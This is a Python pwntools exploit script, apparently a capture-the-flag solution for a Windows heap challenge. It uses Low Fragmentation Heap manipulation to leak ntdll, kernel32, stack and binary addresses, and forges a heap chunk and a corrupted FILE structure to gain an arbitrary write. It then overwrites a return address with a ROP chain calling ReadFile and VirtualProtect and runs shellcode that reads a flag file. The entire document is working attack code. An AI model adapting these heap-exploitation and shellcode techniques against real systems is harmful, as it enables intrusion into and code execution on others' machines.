#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.24"
port = 6677
host = "13.230.51.176"
port = 4869
context.arch = "amd64"    
r = remote(host,port)

def login(user,name):
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(user)
    r.recvuntil(":")
    r.sendline(name)


def add(key,size,data):
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil(":")
    r.send(key)
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(data)

def view(key):
    r.recvuntil(">>")
    r.sendline("2")
    r.recvuntil(":")
    r.send(key)

def free(key):
    r.recvuntil(">>")
    r.sendline("3")
    r.recvuntil(":")
    r.send(key)

def logout():
    r.recvuntil(">>")
    r.sendline("4")

login("ddaa","phdphd")

#Enable LFH
for i in range(19):
    add("lays" + str(i),0x90,"fuck")

#Fill UserBlock
for i in range(0x10): 
    add("dada" + str(i),0x90,"ggwp")

#leave a hole
free("dada15")
#Fill the hole with structure
add("dada14",0x60,'a'*0x70) #leak heap ptr
view("dada14")
r.recvuntil("a"*0x70)
heap =u64(r.recv(8)) & 0xffffffffffff0000
print "heap:",hex(heap)
if heap == 0 :
    exit();
r.recvuntil(p64(0x90))
ids = r.recvuntil("\x00")[:-1]
print "leakid:",ids

#check heap with signature
add("dada14",0x60,'a'*0x70 + p64(heap+0x10)) 
view(ids)
dump = r.recvuntil("ddaa")
if p32(0xffeeffee) not in dump:
    view(ids)
    exit()

def readmem(addr):
    global ids
    add("dada14",0x60,'a'*0x70 + p64(addr))
    view(ids)
    r.recvuntil(":")
    return u64(r.recvuntil("ddaa")[:8].ljust(8,"\x00"))
    
lock = readmem(heap+0x2c0)
ntdll = lock - 0x163cb0-0x20-0x40
print "ntdll:",hex(ntdll)
pebldr = ntdll + 0x1653a0
immol = pebldr + 0x20
ldrdata = readmem(immol)
bin_entry = readmem(ldrdata + 0x28)
bin_base = bin_entry - 0x1e54-0x1c-0x40
print "bin:",hex(bin_base)
iat = bin_base + 0x3000
readfile = readmem(iat)
kernel32 = readfile - 0x22680
print "kernel32:",hex(kernel32)
peb = readmem(ntdll+0x165308) - 0x80
teb = peb + 0x1000
stack = readmem(teb+0x10+1) << 8
print "stack:",hex(stack)
stack_end = stack + (0x10000 - (stack & 0xffff))
cookie = readmem(heap+0x88)
print "cookie:",hex(cookie)
processparameter = readmem(peb+0x20)
hstdin = readmem(processparameter+0x20)
print "hstdin:",hex(hstdin)
password = bin_base + 0x5658
start = stack_end - 8
ret = 0
ret_addr = bin_base+0x1b60
for i in range(0x1000/8):
    addr = start - 8*i
    print i
    v = readmem(addr)
    if v == ret_addr :
        ret = addr
        print "found!"
        break
print "ret:",hex(ret)
if ret == 0 :
    exit()
add("lucas",0x200,"king")
add("lucas",0x100,"ggwp")
add("david942j",0xf0,"a"*0x10+'b'*8)
add("mehqq",0xf0,"qq")
add("mehqq2",0xf0,"qq")
add("mehqq3",0xf0,"qq")
free("mehqq2")
free("david942j")
view("lucas")
dump = r.recvuntil("b"*8)[:-8]
davidfd = u64(dump[-16:-8])
davidbk = u64(dump[-8:])
header = u64(dump[-24:-16])
david = davidfd - 0x200
fakechunk = p64(0) +  p64(header) + p64(password) + p64(davidbk)
logout()
#forge fake chunk in front of fp
login("ddaa" + "\x00"*4 + p64(header) + p64(0xdeadbeef) + p64(password)[:-2],"phdphd" + "\x00"*2 + p64(header) + p64(password-0x28) + p64(david)[:-2])
add("lucas",0x100,"a"*0x100 + fakechunk)
add("yy",0xf0,'g\n')

fp = password + 0x20
cnt = 0
_ptr = 0
_base = ret
flag = 0x2080
fd = 0
bufsize = 0x100+0x10
obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag) + p32(fd) + p32(0) + p64(bufsize) +p64(0)
obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2
add("hh",0xf0,'a'*16 + p64(fp) + p64(0) + obj) # overwrite fp
virtualprotect = kernel32 + 0x1b680
readfile = kernel32 + 0x22680
pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8fb30
buf = bin_base + 0x5800
rop = flat([pop_rdx_rcx_r8_r9_r10_r11,buf,hstdin,0x300,buf-8,0,0,readfile])
rop += flat([pop_rdx_rcx_r8_r9_r10_r11,0x1000,bin_base+0x5000,0x40,buf-8,0,0,virtualprotect,buf])
logout()

# Use FILE stream exploit to do arbitrary writing
login('da','da') # trigger fread to do arbitrary writing
r.send(rop.ljust(0x100,'\x00')) # overwrite return address with rop chain
time.sleep(1)
processheap = peb+0x30
heapcreate = kernel32 + 0x1ec80
ldrheap = ntdll+0x165400
winexec = kernel32+0x5f090
writefile = kernel32 + 0x22770
createfile = kernel32 + 0x222f0
getstdhandle = kernel32+0x1c890
sc = asm("""
    xor rcx,rcx
    xor rdx,rdx
    xor r8,r8
    xor r9,r9
    xor rdi,rdi
    mov cl,2
    mov rdi,0x%x
    call rdi

    mov rdi,0x%x
    mov qword ptr [rdi],rax
    mov rdi,0x%x
    mov qword ptr [rdi],rax

    jmp flagx
s :
    pop r10
createfile:
    mov qword ptr [rsp+0x40],3
    mov qword ptr [rsp+0x30],0
    mov qword ptr [rsp+0x28],0
    lea r12,qword ptr [rsp+0x40]
    mov qword ptr [rsp+0x20],3
    mov r8,1
    xor r9,r9
    mov rdx,0x80000000
    mov rcx,r10
    mov r11,0x%x
    call r11
readfile:
    mov qword ptr [rsp+0x20],0
    xor r9,r9
    mov r8,0x80
    mov rdx,0x%x
    mov rcx,rax
    mov r11,0x%x
    call r11
getstdhandle:
    mov rcx,0xfffffff6
    mov r11,0x%x
    call r11

writefile:
    mov qword ptr [rsp+0x20],0
    xor r9,r9
    mov r8,0x80
    mov rdx,0x%x
    mov rcx,rax
    mov r11,0x%x
    call r11
loop:
    jmp loop

flagx:
    call s
""" % (heapcreate,processheap,ldrheap,createfile,buf+0x400,readfile,getstdhandle,buf+0x400,writefile))
flagfile = "C:\\\\dadadb\\flag.txt"
r.sendline(sc + flagfile + "\x00")

r.interactive()
